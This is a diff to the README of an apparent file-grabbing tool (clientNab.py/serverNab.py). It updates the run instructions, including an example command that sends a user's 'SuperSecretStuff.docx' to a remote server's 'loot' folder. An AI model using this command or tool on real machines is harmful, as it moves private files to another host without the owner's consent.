@@ -16,15 +16,17 @@ Also currently only accepts one connection in
 
 Run like:
 
-    clientNab.py IP PORT FILELOCATION
+    python3 clientNab.py IP PORT FILELOCATION
 
 replacing `IP`, `PORT`, and `FILELOCATION` with the respective values
 
 Example use:
 
-    clientNab.py 192.168.1.30 5555 /Users/{some username}/Documents/SuperSecretStuff.docx
+    python3 clientNab.py 192.168.1.30 5555 /Users/{some username}/Documents/SuperSecretStuff.docx
 
-This will drop that file over to the root folder of where the `serverNab.py` file is running on the server.
+This will drop that file into a loot folder where the `serverNab.py` file is running on the server.
+
+This should also work for Python 2, but the print statements and encoding/decoding might need to be changed.
 
 
 ### Server:
